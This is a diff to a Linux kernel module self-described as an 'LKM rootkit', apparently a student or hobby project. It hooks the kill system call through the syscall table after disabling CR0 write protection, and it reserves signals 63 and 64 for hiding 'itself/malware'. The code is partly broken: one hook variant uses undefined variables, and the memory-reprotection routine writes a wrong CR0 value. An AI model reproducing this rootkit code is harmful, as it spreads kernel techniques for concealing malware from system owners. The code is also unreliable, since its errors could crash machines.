@@ -5,14 +5,122 @@
 #include <linux/sched.h>
 #include <linux/highmem.h>     // for changing page permissions
 #include <asm/unistd.h>        // for system call constants
-#include <linux/kallsyms.h>
+#include <linux/kallsyms.h>    // Contains function e.g. kallsyms_lookup_name
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <asm/paravirt.h>
 
-#define PREFIX "sneaky_process"
+#include <linux/unistd.h>        // for system call constants
+#include <linux/version.h>
+#include <linux/dirent.h>      // Contains dirent structs etc
+
+/* Module Information*/
+//MODULE_LICENSE("GPL");
+MODULE_AUTHOR("jerry");
+MODULE_DESCRIPTION("LKM rootkit");
+MODULE_VERSION("0.0.1");
 
 //This is a pointer to the system call table
-static unsigned long *sys_call_table;
+static unsigned long * sys_call_table;
+
+#ifdef CONFIG_X86_64
+  #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
+    #define PTREGS_SYSCALL_STUB 1
+    typedef asmlinkage long (* ptregs_t)(const struct pt_regs * regs);
+    static ptregs_t orig_kill;
+  #else 
+    typedef asmlinkage long(* orig_kill_t)(pid_t pid, int sig);
+    static orig_kill_t orig_kill;
+  #endif
+#endif
+
+enum signals{
+  SIGSUPER = 64,
+  SIGINVIS = 63,
+};
+
+#if PTREGS_SYSCALL_STUB 
+  static asmlinkage long hack_kill(const struct pt_regs *regs){
+    int sig = regs ->si;
+    if(sig == SIGSUPER) {
+      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGSUPER);
+      return 0;
+    } else if(sig == SIGINVIS){
+      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGINVIS);
+      return 0;
+    }
+    return orig_kill(regs);
+  }
+#else
+
+static asmlinkage long hack_kill(pid_t pid, int sig){
+  int sig = regs ->si;
+    if(sig == SIGSUPER) {
+      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGSUPER);
+      return 0;
+    } else if(sig == SIGINVIS){
+      printk(KERN_INFO "signal: %d == SIGSUPER : %d | hide itself/malware/etc", sig, SIGINVIS);
+      return 0;
+    }
+    return orig_kill(regs);
+}
+
+#endif
+
+static int cleanup(void){
+  /* kill */
+  sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+  return  0;
+  }
+
+static int store(void){
+  #if PTREGS_SYSCALL_STUB
+  /* kill */
+  orig_kill = (ptregs_t) sys_call_table[__NR_kill];
+  printk(KERN_INFO "orig_kill table entry successfully stored \n");
+  #else
+  /* kill */
+  orig_kill = (orig_kill_t) sys_call_table[__NR_kill];
+  printk(KERN_INFO "orig_kill table entry successfully stored \n");
+
+  #endif
+    return 0;
+}
+
+static int hook(void){
+  printk(KERN_INFO "hooked function");
+  /* kill */
+  sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
+
+
+  return 0;
+}
+
+static inline void
+write_cr0_forced(unsigned long val)
+{
+    unsigned long __force_order;
+
+    /* __asm__ __volatile__( */
+    asm volatile(
+        "mov %0, %%cr0"
+        : "+r"(val), "+m"(__force_order));
+}
+
+static void unprotect_memory(void){
+  write_cr0_forced(read_cr0() & (~ 0x10000));
+  printk(KERN_INFO "unprotected memory\n");
+}
+
+static void protect_memory(void){
+  write_cr0_forced(read_cr0() | (~ 0x10000));
+  printk(KERN_INFO "protected memory\n");
+}
+
+/////////////////////////////////////////////////////
+#define PREFIX "sneaky_process"
+
+
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -28,7 +136,7 @@ int enable_page_rw(void *ptr){
 int disable_page_rw(void *ptr){
   unsigned int level;
   pte_t *pte = lookup_address((unsigned long) ptr, &level);
-  pte->pte = pte->pte &~_PAGE_RW;
+  pte->pte = pte->pte & ~_PAGE_RW;
   return 0;
 }
 
@@ -49,11 +157,29 @@ static int initialize_sneaky_module(void)
 {
   // See /var/log/syslog or use `dmesg` for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
-
+  int err = 1;
   // Lookup the address for this symbol. Returns 0 if not found.
   // This address will change after rebooting due to protection
-  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+  #if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
+    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+  #else 
+    sys_call_table = NULL;
+  #endif
 
+  if(! sys_call_table){
+    printk(KERN_INFO "error: sys_call_table == null");
+    return err;
+  }
+
+  if(store() == err){
+    printk(KERN_INFO "error: store error \n");
+  }
+
+  unprotect_memory();
+  if(hook() == err){
+    printk(KERN_INFO "error: hook error\n");
+  }
+  protect_memory();
   // This is the magic! Save away the original 'openat' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
@@ -74,8 +200,13 @@ static int initialize_sneaky_module(void)
 
 
 static void exit_sneaky_module(void) 
-{
+{ int err = 1;
   printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  unprotect_memory();
+  if(cleanup() == err){
+    printk(KERN_INFO "error: cleanup error\n");
+  }
+  protect_memory();
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
